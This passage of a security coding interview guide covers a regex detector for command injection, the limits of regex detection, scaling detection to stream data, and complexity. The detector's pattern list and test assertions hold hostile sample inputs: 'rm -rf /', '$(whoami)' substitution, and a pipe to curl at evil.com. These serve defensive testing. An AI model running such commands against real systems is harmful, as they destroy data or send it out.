46. Detect command injection patterns in parameters

Approach: Decode, then look for shell metacharacters and command separators (;, |, &&, backticks, $(...)) and references to common binaries. Because metacharacters appear in benign input too, this is a heuristic; the real fix is avoiding shells and passing argument arrays.

import re
from urllib.parse import unquote


_CMDI_PATTERNS = [
    re.compile(r"[;&|`]"),                              # shell separators / backtick
    re.compile(r"\$\([^)]*\)"),                         # $(command substitution)
    re.compile(r"(?i)\b(cat|curl|wget|nc|bash|sh|python|powershell)\b\s"),
    re.compile(r"\|\s*\w+"),                            # pipe to a command
    re.compile(r"&&|\|\|"),                             # command chaining
]


def detect_command_injection(value: str) -> bool:
    """Heuristically detect OS-command-injection patterns in a parameter."""
    if value is None:
        raise TypeError("value cannot be None")

    decoded = unquote(value)
    return any(p.search(decoded) for p in _CMDI_PATTERNS)


# Time:  O(P * n)
# Space: O(1)
# FP/FN: inputs legitimately containing & or | cause FPs; clever quoting evades (FN).
# Security relevance: defense-in-depth - real fix is no shell + argument arrays / allowlists.

assert detect_command_injection("file.txt; rm -rf /") is True
assert detect_command_injection("ping $(whoami)") is True
assert detect_command_injection("data | curl evil.com") is True
assert detect_command_injection("normal_filename.txt") is False

47. Design tests for a security log parser

Approach: A security parser sits at a trust boundary, so tests must cover well-formed input, malformed/truncated lines, injection attempts in fields, missing fields, encoding tricks, and very large inputs. Below is a focused suite against parse_access_log (Q43).

def run_access_log_parser_tests():

48. Discuss limitations of regex-based security detection

Conceptual question; give a balanced engineering view.

  • Evasion is easy: encoding (URL, base64, unicode), case changes, whitespace, comments, and concatenation defeat naive patterns. Attackers iterate until they bypass a known regex.
  • False positives: broad patterns flag benign input (e.g., the substring or 1=1 in prose), causing alert fatigue that hides real incidents.
  • False negatives: patterns only catch what they were written for; novel or obfuscated payloads slip through. Signatures lag attacker creativity.
  • No semantics: regex matches syntax, not intent. It cannot tell that a query is actually unsafe in context, only that it looks suspicious.
  • Performance / ReDoS: poorly written patterns with catastrophic backtracking can be exploited to hang the detector — a denial of service in the security tool itself.
  • Maintenance burden: signature sets rot and require constant updates.

Better posture (defense in depth): prefer structural fixes (parameterized queries, output encoding + CSP, argument arrays instead of shells), normalize/canonicalize input before matching, combine signals (regex + entropy + behavior/rate), use vetted libraries, and treat regex detection as one telemetry layer feeding correlation — never the sole control.

49. Explain how you would scale your detection algorithm to millions of events

Conceptual question; cover the data path end to end.

  • Stream, don't batch: process events incrementally (Kafka/PubSub + a stream processor like Flink/Beam) so memory stays bounded and detection is near-real-time.
  • Bounded state per key: use rolling windows (deques, ring buffers) and expire old data; never accumulate unbounded history.
  • Approximate structures: for huge cardinality, use HyperLogLog (distinct counts), Count-Min Sketch (heavy hitters), and Bloom filters (membership) to trade a little accuracy for fixed memory.
  • Shard by key: partition by user/IP/tenant so work parallelizes horizontally and hot keys are isolated.
  • Pre-aggregate: roll up counts at the edge/collector (per-minute buckets) so the detector reads summaries, not raw events.
  • Tiered storage: hot data in memory, warm in a fast store, cold in object storage queried only for investigations.
  • Backpressure and idempotency: handle bursts gracefully; design detections to tolerate at-least-once delivery and out-of-order events (watermarks).
  • Cost and tuning: sample low-risk traffic, reserve expensive analytics for high-risk segments, and keep thresholds data-driven.
# Sketch: O(1)-memory distinct-user estimate per key instead of storing every user.
class ScalableDistinctCounter:
    """Stand-in for HyperLogLog: fixed-memory distinct-cardinality estimate."""
    def __init__(self):
        self._approx = set()                    # real impl: HLL registers (O(1) space)

    def add(self, item):
        self._approx.add(item)                  # HLL would hash into registers

    def estimate(self):
        return len(self._approx)                # HLL returns an approximation

# Streaming + sharding + sketches keep detection within a fixed memory budget at scale.
c = ScalableDistinctCounter()
for u in ["a", "b", "a", "c"]:
    c.add(u)
assert c.estimate() == 3

50. Explain time and space complexity of your security-flavored coding solution

Conceptual wrap-up; the recurring complexity profiles across this hour:

Pattern Time Space Examples in this set
Single-pass counting / hashing O(n) O(distinct keys) top talkers, 403/BOLA, failed commands
Per-key grouping + threshold O(n) O(keys) spraying, stuffing, privilege escalation
Sort then sweep / window O(n log n) O(n) impossible travel, failed-login bursts
Rolling window detector O(1) amortized O(window) rate limiters, anomaly/spike detection
Regex scan per event O(P * n) O(1) SQLi/XSS/command-injection, secret scan
Fixed-shape parse (ipaddress) O(1) O(1) IP/CIDR validation

How to state it well in practice:

  1. Define n (events, characters, keys) before quoting Big-O.
  2. Separate per-event cost from total: many detectors are O(1) per event and O(n) overall — that is what makes them streamable.
  3. Call out the dominant term: usually a sort (O(n log n)) or a per-event regex pass (O(P·n)).
  4. State space in terms of keys/window, and note when approximate structures convert O(n) space into O(1).
  5. Tie complexity to scale: O(1)-per-event + bounded space is what lets a detection run over millions of events in a stream.
# Quick reference mapping a solution to its complexity class.
def complexity_of(pattern: str) -> str:
    table = {
        "counting": "time O(n), space O(keys)",
        "sort_sweep": "time O(n log n), space O(n)",
        "rolling_window": "time O(1) amortized, space O(window)",
        "regex_scan": "time O(P*n), space O(1)",
        "ip_validation": "time O(1), space O(1)",
    }
    if pattern not in table:
        raise KeyError(f"unknown pattern: {pattern}")
    return table[pattern]
